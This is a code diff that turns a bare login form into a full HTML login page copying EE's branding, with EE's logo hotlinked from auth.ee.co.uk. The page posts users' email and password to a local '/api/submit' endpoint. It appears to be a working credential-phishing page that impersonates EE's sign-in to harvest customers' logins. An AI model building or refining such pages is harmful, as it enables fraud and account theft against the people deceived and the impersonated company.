@@ -1,23 +1,139 @@
-<form method="POST">
-  <input type="text" name="email" placeholder="Email" required />
-  <input type="password" name="password" placeholder="Password" required />
-  <button type="submit">Login</button>
-</form>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Page</title>
+    <style>
+        /* General Styles */
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background-color: #fff; /* White background for the entire page */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
 
-<script>
-  document.querySelector('form').addEventListener('submit', async function (e) {
-    e.preventDefault();
-    const formData = new FormData(this);
-    const data = Object.fromEntries(formData);
+        .login-container {
+            background-color: #fff; /* White background for the container */
+            border: 1px solid #333; /* Slightly thinner and lighter border */
+            border-radius: 16px; /* Rounded corners */
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1); /* Subtle shadow for depth */
+            padding: 20px;
+            width: 300px;
+            text-align: left;
+        }
 
-    const res = await fetch('/api/submit', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(data)
-    });
+        .logo {
+            font-size: 24px;
+            color: #057382; /* EE logo color */
+            margin-bottom: 20px;
+            text-align: center;
+        }
 
-    const result = await res.json();
-    if (result.redirect) window.location.href = result.redirect;
-    else alert('An error occurred.');
-  });
-</script>
+        h2 {
+            margin-top: 0;
+            margin-bottom: 20px;
+            color: #057382; /* Same color as the logo */
+            font-weight: bold; /* Make it bold */
+        }
+
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            max-width: 250px; /* Shorter width for input fields */
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            border-radius: 16px; /* Rounded corners */
+        }
+
+        button {
+            width: 100%;
+            max-width: 250px; /* Shorter width for buttons */
+            padding: 10px;
+            background-color: #000;
+            color: #fff;
+            border: none;
+            border-radius: 16px; /* Rounded corners */
+            cursor: pointer;
+            margin-bottom: 10px;
+        }
+
+        button:hover {
+            background-color: #333;
+        }
+
+        a {
+            color: #057382; /* Same color as the logo */
+            text-decoration: underline;
+            margin-bottom: 10px;
+            display: inline-block;
+        }
+
+        .secondary-button {
+            background-color: transparent;
+            border: 1px solid #ccc;
+            color: #000; /* Black color for "Cancel" */
+            border-radius: 16px; /* Rounded corners */
+        }
+
+        .secondary-button:hover {
+            background-color: #f2f2f2;
+        }
+
+        .forgot-password-link {
+            margin-left: 0; /* Align to the left */
+        }
+
+        .create-account {
+            font-weight: bold; /* Make it bold */
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-container">
+        <!-- Logo -->
+        <div class="logo">
+            <img src="https://auth.ee.co.uk/static/content/res/stage-2/nayan/img/logo.png" alt="EE Logo" width="70" height="70">
+        </div>
+
+        <!-- Login Form -->
+        <form id="login-form" action="/api/submit" method="POST">
+            <h2>Log in</h2>
+
+            <!-- Email Field -->
+            <label for="email">Email or username</label>
+            <input type="text" id="email" name="email" placeholder="Email or username" required>
+
+            <!-- Password Field -->
+            <label for="password">Password</label>
+            <input type="password" id="password" name="password" placeholder="Password" required>
+
+            <!-- Next Button -->
+            <button type="submit">Next</button>
+
+            <!-- Forgot Password Link -->
+            <a href="#" id="forgot-password" class="forgot-password-link">Forgot your password?</a>
+
+            <!-- Create Account Section -->
+            <p>Don't have an account?</p>
+            <button type="button" class="secondary-button create-account" id="create-account"><strong>Create account</strong></button>
+
+            <!-- Cancel Button -->
+            <a href="#" id="cancel" style="color: #000;">Cancel</a>
+        </form>
+    </div>
+
+</body>
+</html>
